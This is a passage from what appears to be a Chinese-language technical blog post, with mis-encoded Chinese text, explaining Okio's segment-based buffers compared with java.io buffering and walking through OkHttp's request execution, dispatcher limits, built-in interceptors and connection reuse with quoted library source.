this.sink = sink; //åªæ˜¯æŒªä¸€ä¸‹æŒ‡é’ˆ } } ç”±äºä¸€ä¸ªBufferå³æ˜¯sourceä¹Ÿæ˜¯sinkï¼ŒæŒªä¸€ä¸‹æŒ‡é’ˆå°±è¡Œäº†ã€‚å†™çš„æ—¶å€™å¾€é“¾è¡¨çš„å°¾å·´å†™ï¼Œè¯»çš„æ—¶å€™ä»é“¾è¡¨çš„å¤´éƒ¨è¯»ï¼Œè¯»å®Œäº†segmentå›æ”¶ã€‚ BufferedInputStreamè¦æ±‚å¤–éƒ¨è°ƒç”¨è€…å¸¦ç€ä¸€ä¸ªå›ºå®šå¤§å°çš„byteæ•°ç»„æ¥å–æ•°æ®ï¼Œéš¾å…ä¼šæœ‰äººä¼ è¿›æ¥ä¸€ä¸ªç‰¹åˆ«å°çš„æ•°ç»„ï¼Œè¿™æ ·æ°¸è¿œä¸å¯èƒ½è¯»å–è¶…è¿‡è¿™ä¸ªæ•°ç»„å¤§å°é•¿åº¦çš„æŸä¸€è¡Œã€‚ è¯»å†™è¿™ç§äº‹æƒ…æ“ä½œèµ·æ¥æ€»æ˜¯ä»ä¸€ä¸ªè¿‘ä¼¼æ— é™å¤§çš„æ•°æ®æº ä¸€ç‚¹ä¸€ç‚¹åœ°å–å‡ºæ¥ å­˜åœ¨ä¸€ä¸ªå†…å­˜ä¸­ä¸€ä¸ªä¸´æ—¶çš„åœ°æ–¹ï¼Œ ç„¶åå†è®²è¿™éƒ¨åˆ†æ•°æ®äº¤ç»™å…¶ä»–æ¥æ”¶æ–¹ã€‚ è¿™å°±è¦æ±‚æ‰€æœ‰çš„è¯»å†™éƒ½è¦å‡†å¤‡è¿›è¡Œå¤šæ¬¡è¯»å†™ï¼Œæ¯æ¬¡è¯»åˆ°ä¸€ä¸ªä¸­è½¬ç«™ä¸­ã€‚åœ¨java ioä¸­è¿™ä¸ªä¸­è½¬ç«™çš„å¤§å°æ˜¯å›ºå®šçš„ï¼Œokioä¸­è¿™ä¸ªä¸­è½¬ç«™æ˜¯ä¸€ä¸ªä¸ªçš„Segmentè¿æ¥èµ·æ¥çš„ã€‚java ioä¸­å„ç§decorateræµä¹‹é—´çš„åŒ…è£…å¸¦æ¥äº†System.arrayCopy new DataInputStream(new BufferedInputStream(new FileInputStream(&quot;&quot;))); ` ä¸Šé¢DataInputStreamé€šå¸¸ç”¨äºæ–¹ä¾¿çš„è¯»å–åŸºæœ¬æ•°æ®ç±»å‹ï¼Œæ¯”å¦‚readChar,readLongï¼ŒreadByteç­‰ç­‰.ä¾‹å¦‚ dataInputstream.readByte -&gt; BufferedInputStream.read -&gt; FileInputStream.read åœ¨BufferedInputStreamä¸­æœ‰ä¸€å±‚byte[] buf. BufferedInputStreamçš„readæœ‰ä¸¤ç§ï¼Œä¸€æ˜¯ä¸€æ¬¡è¯»ä¸€ä¸ªbyteï¼Œä¸€ç§æ˜¯å¤–éƒ¨ä¼ ä¸€ä¸ªbyteï¼ŒæŒ‡å®šoffsetå’Œlenã€‚ç¬¬ä¸€ç§è¦ç»å†fillæ–¹æ³•ï¼Œç¬¬äºŒç§åˆ™æ˜¯å…ˆå¡«æ»¡è‡ªå·±çš„bufï¼Œç„¶åSystem.arraycopyåˆ°å¤–éƒ¨ä¼ å…¥çš„dstæ•°ç»„ä¸­ã€‚å½“ç„¶å¦‚æœå¤–ç•Œè¦æ±‚çš„lenè¶…å‡ºbuff.lengthï¼Œé‚£ä¹ˆç›´æ¥è·³è¿‡bufè¿™ä¸€å±‚ã€‚ è°ƒç”¨fillæ–¹æ³•çš„å‰ææ˜¯å‘ç°pos &gt;= count ï¼Œä¹Ÿå°±æ˜¯æ˜¯è¯´æå‰é¢„è¯»å–çš„æ•°æ®ä¸å¤Ÿäº†ï¼Œfillæ–¹æ³•ä¸»è¦æ˜¯ä»0å¼€å§‹é‡æ–°ä»åº•å±‚è¯»å–æ•°æ®ï¼ŒæœŸæœ›ä»åº•å±‚è¯»å–buf.length - pos ä¸ªæ•°æ® pos = 0; /* no mark: throw away the buffer */ count = pos; int n = getInIfOpen().read(buffer, pos, buffer.length - pos); if (n &gt; 0) count = n + pos; //æ‰€ä»¥ç†æƒ³æƒ…å†µä¸‹ï¼Œæ¯æ¬¡fillæ–¹æ³•çš„è°ƒç”¨éƒ½ä¼šå¾€bufé‡Œé¢å¡8192ä¸ªbyteï¼Œ count = 8192 , pos = 0.ä¸‹ä¸€ä¸ªreadä»0å¼€å§‹ï¼ŒåŒæ—¶å·²ç»é¢„è¯»å–äº†ä¸€éƒ¨åˆ†æ•°æ®ï¼Œä»posåˆ°countçš„æ•°æ®éƒ½æ˜¯ä¸‹ä¸€æ¬¡readå¯ä»¥ç›´æ¥è¯»çš„ã€‚è¿™é‡Œé¢å¹¶ä¸æ¶‰åŠarrayCopy. xxxOutputSreamä¸­å¸¸å¸¸çœ‹åˆ°è¿™æ ·ä¸€å¥è¯/ If the request length exceeds the size of the output buffer, flush the buffer and then write the data directly. In this way buffered streams will cascade harmlessly. /å›é¡¾BufferedInputStreamå’ŒBufferedOutputSreamå­˜åœ¨çš„ä¸»è¦æ„ä¹‰æ˜¯é¢„é˜²é‚£ç§æ•°æ®å¾ˆå°‘çš„è¯»å†™ï¼Œå¦‚æœæ˜¯ä¸€æ¬¡æ€§çš„å¤§æ‰¹é‡è¯»å–ï¼Œåˆ™ç›´æ¥è·³è¿‡buffä¸€å±‚ã€‚ åœ¨jake whartonçš„forcing-bytes-downward-in-okio ä¸­æœ‰è¿™ä¹ˆä¸€æ®µè¯ With java.io.* streams, however, multiple levels of buffering require each level to allocate and manage its own byte[]. This means that a flush operation will result in each level doing an arraycopy() of its data down to the next level (which also might have required buffer expansion). æŸ¥äº†ä¸‹BufferdOutputStream.flush // 1. public synchronized void flush() throws IOException { flushBuffer(); out.flush(); } // 2 private void flushBuffer() throws IOException { if (count &gt; 0) { out.write(buf, 0, count); count = 0; } } // 3.1 BuuferdOutputStreamçš„writeæ–¹æ³• public synchronized void write(byte b[], int off, int len) throws IOException { if (len &gt;= buf.length) { /* If the request length exceeds the size of the output buffer, flush the output buffer and then write the data directly. In this way buffered streams will cascade harmlessly. è¶…è¿‡å¤§å°ç›´æ¥è·³è¿‡ç¼“å­˜ */ flushBuffer(); out.write(b, off, len); return; } if (len &gt; buf.length - count) { flushBuffer(); } System.arraycopy(b, off, buf, count, len); //è¿™é‡Œä¸€å®šä¼šèµ°åˆ°arrayCopy //å‡è®¾ count += len; } // 3.2 ByteArrayOutputStreamçš„writeæ–¹æ³• public synchronized void write(byte b[], int off, int len) { if ((off &lt; 0) || (off &gt; b.length) || (len &lt; 0) || ((off + len) - b.length &gt; 0)) { throw new IndexOutOfBoundsException(); } ensureCapacity(count + len); System.arraycopy(b, off, buf, count, len); count += len; } // 3.3 BufferedWriterï¼ˆè™½ç„¶å·²ç»ä¸ç®—streamäº†ï¼‰ public void write(char cbuf[], int off, int len) throws IOException { synchronized (lock) { while (b &lt; t) { int d = min(nChars - nextChar, t - b); System.arraycopy(cbuf, b, cb, nextChar, d); b += d; nextChar += d; if (nextChar &gt;= nChars) flushBuffer(); } } } éƒ½æ˜¯arrayCopyï¼Œå¯ä»¥æƒ³è±¡ï¼Œä¸€å±‚å±‚çš„flushè°ƒç”¨ä¼ é€’ä¸‹æ¥ï¼Œæ¯ä¸€å±‚çš„bufferéƒ½ä¼šè¢«é€šè¿‡arrayCopyçš„æ–¹å¼ä¼ é€’åˆ°ä¸‹ä¸€å±‚ã€‚æ¯”æ–¹è¯´ï¼ŒåŒ…äº†3å±‚BufferdOutputStreamå°±è¦arrayCopyä¸‰æ¬¡ï¼Œæå…¶è´¹äº‹ã€‚ //åœ¨Okioä¸­ï¼Œä¸å­˜åœ¨è¿™æ ·çš„copy,//Bufferçš„å®šä¹‰æ˜¯â€A collection of bytes in memory.â€ï¼Œä¸æ•°ç»„ä¸åŒï¼ŒBufferä¹‹é—´ä¼ é€’æ•°æ®çš„æ–¹å¼æ˜¯æŒªæŒ‡é’ˆã€‚ BufferedSourceåœ¨è¯»å–Socketæ•°æ®æ—¶ï¼Œä¸€è¾¹ä»socketé‡Œé¢æ‹¿ä¸€ä¸ªSegmentå¤§å°çš„æ•°æ®ï¼Œç„¶åè°ƒç”¨readInt,readLongç­‰æ–¹æ³•è¿”å›int,long(åŒæ—¶ä»segmentå¤´éƒ¨æ¸…ç©ºæ•°æ®)ã€‚å¦‚æœè¯»åˆ°segmentæœ€åå‘ç°å‰©ä¸‹çš„byteä¸èƒ½ç»„æˆä¸€ä¸ªintï¼Œå°±ä¼šä»segment poolä¸­å€Ÿä¸€ä¸ªsegmentï¼Œå¹¶ä»socketä¸­è¯»å–æ•°æ®å¡æ»¡ï¼ŒæŠŠç¬¬ä¸€ä¸ªsegmentå‰©ä¸‹çš„ä¸€ç‚¹byteå’Œç¬¬äºŒä¸ªsegmentçš„å¤´éƒ¨ä¸€ç‚¹æ‹¼æˆä¸€ä¸ªintã€‚ä»¥BufferSourceçš„readIntä¸ºä¾‹: public int readInt() { if(this.size &lt; 4L) { throw new IllegalStateException(&quot;size &lt; 4: &quot; + this.size); } else { Segment segment = this.head; int pos = segment.pos; int limit = segment.limit; if(limit - pos &lt; 4) { //ä¸€ä¸ªint 4ä¸ªbyte,è¿™æ—¶å€™segmentä¸­æœªè¯»çš„æ•°æ®åªå‰©ä¸‹ä¸åˆ°4ä¸ªäº† return (this.readByte() &amp; 255) &lt;&lt; 24 | (this.readByte() &amp; 255) &lt;&lt; 16 | (this.readByte() &amp; 255) &lt;&lt; 8 | this.readByte() &amp; 255; //readByteå°±æ˜¯ä»é“¾è¡¨çš„å¤´éƒ¨å¼€å§‹ä¸€ä¸ªbyteä¸€ä¸ªbyteçš„è¯»ï¼Œsegmentè¯»å®Œäº†è‡ªåŠ¨å›æ”¶ï¼Œç›´åˆ°ç»„æˆä¸€ä¸ªintã€‚ } else { //å‰©ä¸‹çš„byteè¶³å¤Ÿç»„æˆä¸€ä¸ªint byte[] data = segment.data; int i = (data[pos++] &amp; 255) &lt;&lt; 24 | (data[pos++] &amp; 255) &lt;&lt; 16 | (data[pos++] &amp; 255) &lt;&lt; 8 | data[pos++] &amp; 255; //ä»byteè½¬int this.size -= 4L; if(pos == limit) { this.head = segment.pop(); SegmentPool.recycle(segment); //è¯»å®Œäº†å°±æŠŠsegmentå›æ”¶ } else { segment.pos = pos; } return i; } } } ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„ç°è±¡æ˜¯ï¼Œjava BufferedInputStreamçš„é»˜è®¤bufferæ•°ç»„å¤§å°æ˜¯8192ï¼Œokio çš„segmentçš„é»˜è®¤sizeä¹Ÿæ˜¯8192ï¼Œè¿™äº›éƒ½æ˜¯ä»¥byteä¸ºå•ä½çš„ã€‚æ‰¾åˆ°ä¸€ä¸ªåˆç†çš„è§£é‡Šã€‚å¤§è‡´æ„æ€æ˜¯8192 = 2^13, windowså’Œlinuxä¸Šè¿™ä¸ªå¤§å°æ­£å¥½å ç”¨ä¸¤ä¸ªåˆ†é¡µæ–‡ä»¶(8kB)ã€‚å¦å¤–java ioçš„ç±»å›¾ç¡®å®è®©äººçœ¼èŠ±ç¼­ä¹±ã€‚ 2. OkHttpçš„è§£æ2.1 ä½¿ç”¨ä»‹ç»å…ˆä¸Šä¸€å¼ å›¾ã€‚è¿™æ˜¯æœ€ç®€å•çš„ç›´æ¥ç”¨OkHttpClientè¯·æ±‚ç™¾åº¦é¦–é¡µçš„å †æ ˆè°ƒç”¨æƒ…å†µã€‚åœ¨æ²¡æœ‰åšä»»ä½•æ‰‹åŠ¨é…ç½®çš„æƒ…å†µä¸‹ï¼Œè‡³å°‘å‘ç°äº†äº”ä¸ªInterceptor: RetryAndFollowUpInterceptor BridgeInterceptor CacheInterceptor ConnectInterceptor CallServerInterceptor // è¿™é‡Œé¢æ²¡æœ‰å†è°ƒç”¨chain.proceedï¼Œæ‰€ä»¥è´£ä»»é“¾åˆ°æ­¤è¿”å› èµ°åˆ°CallServerInterceptorçš„æ—¶å€™ï¼Œå¯ä»¥çœ‹åˆ°Responseå·²ç»å½¢æˆäº†ã€‚è½®åˆ°æ¯ä¸€ä¸ªInterceptorçš„interceptï¼ˆChain ï¼‰æ–¹æ³•æ‰§è¡Œçš„æ—¶å€™ï¼Œä¼ å…¥çš„éƒ½æ˜¯ä¸€ä¸ªnew çš„RealInterceptorChainï¼Œåªä¸è¿‡index+1äº†(å…¶å®å”¯ä¸€å˜åŒ–çš„ä¹Ÿå°±åªæœ‰è¿™ä¸ªindexäº†)ï¼ˆè€Œä¸€èˆ¬å†™interceptorçš„æ—¶å€™ç›´æ¥æ‹¿ç€ä¼ å…¥çš„chain.proceedå°±å¯ä»¥äº†ï¼‰ é¦–å…ˆæ˜¯è°ƒç”¨è€…çš„ä»£ç  mClient = new OkHttpClient() //åŒæ­¥æ‰§è¡Œ Request request = new Request.Builder() .url(&quot;http:www.baidu.com&quot;) .build(); Call call = mClient.newCall(request); Response response = null; try { response = call.execute(); } catch (IOException e) { e.printStackTrace(); } //å¼‚æ­¥æ‰§è¡Œä»£ç  Request request = new Request.Builder() .url(&quot;http:www.baidu.com&quot;) .build(); Call call = mClient.newCall(request); call.enqueue(new Callback() { @Override public void onFailure(Call call, IOException e) { } @Override public void onResponse(Call call, Response response) throws IOException { } }); 2.2 å‚æ•°é…ç½®é¦–å…ˆRequest.Builder().build()æ–¹æ³•ï¼Œè¿™é‡Œé¢åªæ˜¯ä½¿ç”¨Builderæ¨¡å¼ï¼Œå’ŒRetrofitå¾ˆç›¸ä¼¼ï¼Œæ–¹ä¾¿é“¾å¼è°ƒç”¨ã€‚æœ€ç»ˆè°ƒç”¨äº†Requestçš„æ„é€ å‡½æ•° Request(Request.Builder builder) { this.url = builder.url; //HttpUrlç±»å‹ this.method = builder.method; //Stringç±»å‹ this.headers = builder.headers.build(); //headerå°±æ˜¯ä¸ªå­—å…¸ï¼Œå†…éƒ¨ç”¨ä¸€ä¸ªStringæ•°ç»„ç»´æŠ¤ã€‚ this.body = builder.body;// RequestBodyç±»å‹ï¼Œç”¨äºPOSTæäº¤è¡¨å•æˆ–è€…Multipartä¸Šä¼ æ–‡ä»¶ã€‚ this.tag = builder.tag != null?builder.tag:this; //Objectç±»å‹ } Requesté‡Œé¢çš„æˆå‘˜ä»£è¡¨äº†ä¸€ä¸ªç½‘ç»œè¯·æ±‚æ‰€åº”è¯¥æœ‰çš„ä¸€åˆ‡å¯èƒ½çš„å…ƒç´ ï¼Œæ²¡ä»€ä¹ˆå¯è¯´çš„ã€‚OkHttpClientçš„æ„é€ ä¹Ÿæ˜¯Builderæ¨¡å¼ï¼Œä¸€æ—¦åˆ›å»ºäº†ä¸èƒ½setXX.æ‰¾åˆ°ä¸€ä¸ªæ¯”è¾ƒä¸°å¯Œçš„ä¾‹å­ client = new OkHttpClient.Builder() .retryOnConnectionFailure(true) .connectTimeout(15, TimeUnit.SECONDS) //è®¾ç½®ç¼“å­˜ .cache(cache) .build(); åˆ°è¿™é‡Œéƒ½è¿˜åªæ˜¯å‘èµ·çœŸæ­£çš„è¯·æ±‚ä¹‹å‰çš„configurationé˜¶æ®µï¼Œæ¥çœ‹å‘èµ·RealCallçš„è¿‡ç¨‹ Call call = mClient.newCall(request); è¿™é‡Œé¢åˆå§‹åŒ–äº†ä¸€ä¸ªRetryAndFollowUpInterceptorã€‚è¿™ä¸ªæ‹¦æˆªå™¨çš„ä½œç”¨æ˜¯åœ¨è¿æ¥serverå¤±è´¥åè‡ªåŠ¨é‡è¿ï¼Œä½†æœåŠ¡å™¨500å°±ä¸ä¼šé‡è¿,å‚è€ƒokhttp-is-quietly-retrying-requests-is-your-api-ready 2.3 å¼€å§‹æ‰§è¡Œè¯·æ±‚response = call.execute(); @Override public Response execute() throws IOException { synchronized (this) { if (executed) throw new IllegalStateException(&quot;Already Executed&quot;); executed = true; } captureCallStackTrace(); eventListener.callStart(this); try { client.dispatcher().executed(this);//è¿™é‡Œåªæ˜¯æŠŠrealCallæ·»åŠ åˆ°äº†Disptcherçš„RunningSyncallè¿™ä¸ªdequeä¸­ï¼Œåªæ˜¯ä¸ºäº†è®°ä¸ªæ•°ï¼Œä»¥åŠæ–¹ä¾¿cancel Response result = getResponseWithInterceptorChain(); if (result == null) throw new IOException(&quot;Canceled&quot;); return result; } catch (IOException e) { eventListener.callFailed(this, e); throw e; } finally { client.dispatcher().finished(this);//ä»dequeä¸­ç§»é™¤ } } é‡ç‚¹å°±åœ¨getResponseWithInterceptorChainé‡Œé¢ Response getResponseWithInterceptorChain() throws IOException { List&lt;Interceptor&gt; interceptors = new ArrayList(); interceptors.addAll(this.client.interceptors()); interceptors.add(this.retryAndFollowUpInterceptor); interceptors.add(new BridgeInterceptor(this.client.cookieJar())); interceptors.add(new CacheInterceptor(this.client.internalCache())); interceptors.add(new ConnectInterceptor(this.client)); if(!this.forWebSocket) { interceptors.addAll(this.client.networkInterceptors()); } interceptors.add(new CallServerInterceptor(this.forWebSocket)); Chain chain = new RealInterceptorChain(interceptors, (StreamAllocation)null, (HttpCodec)null, (RealConnection)null, 0, this.originalRequest); return chain.proceed(this.originalRequest); } æ³¨æ„é¡ºåºï¼Œç”¨æˆ·æ‰‹åŠ¨æ·»åŠ çš„interceptoræ˜¯æœ€å…ˆæ·»åŠ çš„ã€‚åœ¨æ·»åŠ å®ŒConnectInterceptorä¹‹åï¼Œåˆæ·»åŠ äº†networkInterceptors(ç”¨æˆ·æ‰‹åŠ¨æ·»åŠ çš„ï¼Œä¸€ä¸ªList)ã€‚é“ç†ä¹Ÿå¾ˆæ¸…æ¥šï¼Œä¸€ç§æ˜¯åœ¨å‘èµ·Socketè¯·æ±‚ä¹‹å‰å°±æ‹¦ä¸‹æ¥ï¼Œä¸€ç§æ˜¯è¿ä¸ŠSocketä¹‹åçš„æ‹¦æˆª Chainçš„proceedå°±æ˜¯ä»Listä¸­ä¸€ä¸ªä¸ªå–å‡ºInterceptorï¼Œç„¶åæ‰§è¡Œ å…³äºå¼‚æ­¥è¯·æ±‚çš„çº¿ç¨‹æ± é—®é¢˜ï¼Œå¼‚æ­¥è¯·æ±‚å®é™…çš„è°ƒç”¨æ˜¯è¿™æ ·çš„Dispatcher.java synchronized void enqueue(AsyncCall call) { if (runningAsyncCalls.size() &lt; maxRequests &amp;&amp; runningCallsForHost(call) &lt; maxRequestsPerHost) { runningAsyncCalls.add(call);//å½“å‰è¿è¡Œçš„å¼‚æ­¥ä»»åŠ¡å°‘äºmaxRequestï¼Œå¹¶ä¸”é’ˆå¯¹å½“å‰hostå‘èµ·çš„è¯·æ±‚å°‘äºmaxRequestsPerHost(é»˜è®¤æ˜¯5ä¸ªï¼Œä¹Ÿå°±æ˜¯é»˜è®¤åŒæ—¶åªèƒ½å¯¹1ä¸ªåŸŸåå‘èµ·5ä¸ªè¯·æ±‚ï¼Œè¿™ä¸ªè·Ÿæµè§ˆå™¨å¾ˆåƒ) executorService().execute(call);// ä¸¢ç»™çº¿ç¨‹æ±  } else { readyAsyncCalls.add(call);//æ·»åŠ åˆ°é˜Ÿåˆ—ä¸­å» } } /** Ready async calls in the order they&#39;ll be run. */ private final Deque&lt;AsyncCall&gt; readyAsyncCalls = new ArrayDeque&lt;&gt;(); //æ’é˜Ÿç­‰å¾…è¢«æ‰§è¡Œçš„å¼‚æ­¥ä»»åŠ¡ /** Running asynchronous calls. Includes canceled calls that haven&#39;t finished yet. */ private final Deque&lt;AsyncCall&gt; runningAsyncCalls = new ArrayDeque&lt;&gt;();//æ­£åœ¨è¿è¡Œä¸­çš„å¼‚æ­¥ä»»åŠ¡ /** Running synchronous calls. Includes canceled calls that haven&#39;t finished yet. */ private final Deque&lt;RealCall&gt; runningSyncCalls = new ArrayDeque&lt;&gt;();//åŒæ­¥çš„è¿è¡Œçš„æˆ–è€…å·²ç»è¢«å–æ¶ˆçš„è¯·æ±‚ å¼‚æ­¥è¯·æ±‚ï¼šå’Œæµè§ˆå™¨ç›¸ä¼¼ï¼Œokhttp clientä¹Ÿè®¾å®šäº†å®¢æˆ·ç«¯åŒæ—¶åªèƒ½å¯¹ä¸€ä¸ªhostå‘èµ·æœ‰ä¸Šé™çš„è¿æ¥æ•°(5ä¸ª)ï¼Œå¹¶ä¸”ï¼Œæ‰€æœ‰çš„è¯·æ±‚æ€»æ•°åŠ åœ¨ä¸€èµ·ä¸è¶…è¿‡64ä¸ªã€‚è¶…è¿‡çš„åŠ åˆ°ä¸€ä¸ªDequeä¸­ï¼Œç­‰å¼‚æ­¥ä»»åŠ¡æ‰§è¡Œå®Œæˆåï¼Œæœ‰ä¸€ä¸ªfinallyï¼Œè¿™é‡Œé¢æœ‰ä¸€ä¸ªpromoteCallsï¼Œå°±æ˜¯è¯´å¯ä»¥å»æ¶ˆè´¹åˆšæ‰æ’é˜Ÿçš„è¯·æ±‚äº†ã€‚åŒæ­¥è¯·æ±‚ï¼šè€ŒRealCallçš„executeæ–¹æ³•å°±å®Œå…¨æ˜¯ä¸€ä¸ªåœ¨å½“å‰çº¿ç¨‹ä¸­æ‰§è¡Œçš„æ–¹æ³•ï¼Œæ²¡æœ‰ä»»ä½•é™åˆ¶ï¼Œåªæ˜¯å°†è¿™ä¸ªè¯·æ±‚åŠ å…¥äº†Dispatcherçš„runningSyncCallsä¸­å»äº† æ‰€ä»¥ï¼Œå¯¹äºä½¿ç”¨enqueueæ–¹æ³•çš„åº”ç”¨ï¼Œå¦‚æœåŒæ—¶1så†…å¯¹ä¸€ä¸ªhostå‘èµ·çš„è¯·æ±‚è¶…è¿‡äº†5ä¸ªï¼Œå¹¶ä¸”ç½‘ç»œä¹Ÿç‰¹åˆ«å·®çš„æƒ…å†µä¸‹ï¼Œéœ€è¦ç­‰åˆ°è‡³å°‘timeout(connectTimeout)-1sçš„æ—¶é—´åæ‰èƒ½è½®åˆ°åç»­çš„è¯·æ±‚æ‰§è¡Œã€‚ä½¿ç”¨executeæ–¹æ³•çš„åˆ™ä¸å—é™åˆ¶ã€‚ ç”¨æˆ·æ„ŸçŸ¥åˆ°çš„å»¶æ—¶æ˜¯ï¼šç½‘ç»œè¯·æ±‚çš„æ—¶é—´ = é˜Ÿåˆ—ç­‰å¾…æ—¶é—´+dnsè§£ææ—¶é—´+socketè¿æ¥æ—¶é—´+socket ioæ—¶é—´ OkHttpClient.Builder httpClientBuilder = new OkHttpClient.Builder() .readTimeout(30, TimeUnit.SECONDS) .connectTimeout(30, TimeUnit.SECONDS) .writeTimeout(30, TimeUnit.SECONDS) .addInterceptor(new HeaderInterceptor()) å…³äºtimeoutï¼Œå¤–éƒ¨è®¾ç½®çš„æ—¶å€™å¯ä»¥è®¾å®šçš„è¶…æ—¶åŒ…æ‹¬: è¿æ¥socketçš„è¶…æ—¶ï¼Œè¯»è¶…æ—¶ï¼Œå†™è¶…æ—¶è¿æ¥socketè¶…æ—¶æ˜¯ç›´æ¥è°ƒç”¨socket.setSoTimeoutå®ç°çš„ï¼Œè¿™ä¸ªæ˜¯æŒ‡ï¼Œå¯¹è¿™ä¸ªsocketçš„readæ“ä½œåªä¼šå µå¡è¿™ä¹ˆé•¿æ—¶é—´(å°±æ˜¯è¯´å‡å¦‚è¿™ä¹ˆé•¿æ—¶é—´å†…æ²¡æœ‰æ•°æ®)ï¼Œä¹‹åè·‘å‡ºä¸€ä¸ªSocketTimeoutExceptionã€‚ 3. è‡ªå¸¦çš„äº”ä¸ªInterceptor3.1 RetryAndFollowUpInterceptor while(!this.canceled) { Response response = null; boolean releaseConnection = true; try { response = ((RealInterceptorChain)chain).proceed(request, this.streamAllocation, (HttpCodec)null, (RealConnection)null); releaseConnection = false; } catch (RouteException var13) { releaseConnection = false; continue; } catch (IOException var14) { releaseConnection = false; continue; } finally { if(releaseConnection) { this.streamAllocation.streamFailed((IOException)null); this.streamAllocation.release(); } } Request followUp = this.followUpRequest(response); if(followUp == null) { return response; } ++followUpCount; if(followUpCount &gt; 20) { this.streamAllocation.release(); throw new ProtocolException(&quot;Too many follow-up requests: &quot; + followUpCount); } } è¿™é‡Œé¢å†™æ­»äº†ä¸€ä¸ªå¾ªç¯ï¼Œåªè¦æ²¡æœ‰cancelï¼Œcatchåˆ°ç‰¹å®šçš„Exceptionå°±ä¸€ç›´è®©é“¾æ¡èµ°ä¸‹å»ã€‚ 3.2 BridgeInterceptorè¿™æ˜¯ç¬¬äºŒä¸ªInterceptorinterceptors.add(new BridgeInterceptor(this.client.cookieJar()));//æ³¨æ„å¸¦è¿›æ¥äº†cookieï¼Œä¸»è¦éƒ½æ˜¯æ·»åŠ headerä»€ä¹ˆçš„ public Response intercept(Chain chain) throws IOException { Request userRequest = chain.request(); if(userRequest.header(&quot;Host&quot;) == null) { requestBuilder.header(&quot;Host&quot;, Util.hostHeader(userRequest.url(), false)); } Response networkResponse = chain.proceed(requestBuilder.build()); okhttp3.Response.Builder responseBuilder = networkResponse.newBuilder().request(userRequest); } return responseBuilder.build(); } éƒ½æ˜¯äº›Host,Connection Keep-Alive,User-Agent,Content-Lengthç­‰è·Ÿheaderæœ‰å…³çš„ä¸œè¥¿ã€‚éšåå°†requestäº¤ç»™é“¾æ¡çš„ä¸‹ä¸€ä¸ªinterceptorã€‚Responseå›æ¥ä¹‹åç›¸åº”set-Cookieè¿™äº›ä¸œè¥¿ï¼Œä¸‹æ¬¡è¯·æ±‚å¸¦ä¸Šcookieï¼Œè¿™äº›éƒ½æ˜¯Httpçš„æ ‡å‡†æ­¥éª¤ã€‚ 3.3 CacheInterceptoræ¥ä¸‹æ¥è½®åˆ°cacheï¼Œå¯¹äºresponseçš„å¤„ç†ä¹Ÿæ˜¯å·®ä¸å¤šçš„è¿‡ç¨‹ public Response intercept(Chain chain) throws IOException { Response cacheCandidate = this.cache != null?this.cache.get(chain.request()):null; Request networkRequest = strategy.networkRequest; Response cacheResponse = strategy.cacheResponse; Response networkResponse = null; networkResponse = chain.proceed(networkRequest); Response response; if(cacheResponse != null) { if(networkResponse.code() == 304) { response = cacheResponse.newBuilder().headers(combine(cacheResponse.headers(), networkResponse.headers())).sentRequestAtMillis(networkResponse.sentRequestAtMillis()).receivedResponseAtMillis(networkResponse.receivedResponseAtMillis()).cacheResponse(stripBody(cacheResponse)).networkResponse(stripBody(networkResponse)).build(); networkResponse.body().close(); this.cache.trackConditionalCacheHit(); this.cache.update(cacheResponse, response); return response; //åªé’ˆå¯¹304åšäº†è‡ªåŠ¨cache } Util.closeQuietly(cacheResponse.body()); } response = networkResponse.newBuilder().cacheResponse(stripBody(cacheResponse)).networkResponse(stripBody(networkResponse)).build(); return response; } è¿™é‡Œä¹Ÿæ˜¯è®©è¯·æ±‚æ¥ç€èµ°ä¸‹å»ï¼Œresponseå›æ¥ä¹‹åï¼Œåªæœ‰304çš„æ—¶å€™æ‰ä¼šå»ä¸»åŠ¨cacheä¸‹æ¥ã€‚ 3.4 ConnectInterceptor(æ·±å…¥okHttp 3.9.1çš„connectionPoolä»¥åŠå¼•ç”¨è®¡æ•°)åœ¨é«˜å¹¶å‘çš„è¯·æ±‚è¿æ¥æƒ…å†µä¸‹æˆ–è€…åŒä¸ªå®¢æˆ·ç«¯å¤šæ¬¡é¢‘ç¹çš„è¯·æ±‚æ“ä½œï¼Œæ— é™åˆ¶çš„åˆ›å»ºè¿æ¥ä¼šå¯¼è‡´æ€§èƒ½ä½ä¸‹ã€‚æ‰€ä»¥OkHttpåšåˆ°äº†å¯¹socketçš„å¤ç”¨å’ŒåŠæ—¶æ¸…ç†ã€‚ä»ç¬¬å››ä¸ªintercepterå¼€å§‹ConnectInterceptor.java public final class ConnectInterceptor implements Interceptor{ @Override public Response intercept(Chain chain) throws IOException { RealInterceptorChain realChain = (RealInterceptorChain) chain; Request request = realChain.request(); // ç¬¬ä¸€æ­¥ï¼Œè·å–streamAllocation StreamAllocation streamAllocation = realChain.streamAllocation(); // We need the network to satisfy this request. Possibly for validating a conditional GET. boolean doExtensiveHealthChecks = !request.method().equals(&quot;GET&quot;); // ç¬¬äºŒæ­¥ï¼Œä½¿ç”¨streamAllocationåˆ›å»º(æˆ–è€…å¤ç”¨)ä¸€ä¸ªhttpCodecæ¨¡å‹ï¼ˆå³å¤„ç†headerå’Œbodyçš„è¯»å†™ç­–ç•¥ï¼Œå…·ä½“å®ç°åŒ…æ‹¬Http1Codecå’ŒHttp2Codecï¼‰ HttpCodec httpCodec = streamAllocation.newStream(client, chain, doExtensiveHealthChecks); // ç¬¬ä¸‰éƒ¨ï¼ŒæŒ‘é€‰å‡ºRealConnection,streamAllocationå¯¹è±¡ä¸­çš„mConnectionå˜é‡æ˜¯åœ¨ç¬¬äºŒæ­¥é‡Œé¢èµ‹å€¼çš„ RealConnection connection = streamAllocation.connection(); return realChain.proceed(request, streamAllocation, httpCodec, connection); } } æ‰€ä»¥socketè¿æ¥å¤ç”¨å°±åœ¨è¿™å¥è¯é‡Œé¢äº† HttpCodec httpCodec = streamAllocation.newStream(client, chain, doExtensiveHealthChecks); StreamAllocation.java public HttpCodec newStream( OkHttpClient client, Interceptor.Chain chain, boolean doExtensiveHealthChecks) { // çœç•¥éƒ¨åˆ†ï¼Œä¸»è¦æ˜¯è¿™ä¸¤å¥è¯ RealConnection resultConnection = findHealthyConnection(connectTimeout, readTimeout, writeTimeout, connectionRetryEnabled, doExtensiveHealthChecks); // HttpCodec resultCodec = resultConnection.newCodec(client, chain, this); } findHealthyConnectionæœ€ç»ˆèµ°åˆ°è¿™é‡Œ // Attempt to get a connection from the pool. for (RealConnection connection : connections) { if (connection.isEligible(address, route)) { streamAllocation.acquire(connection, true); return connection; } } // 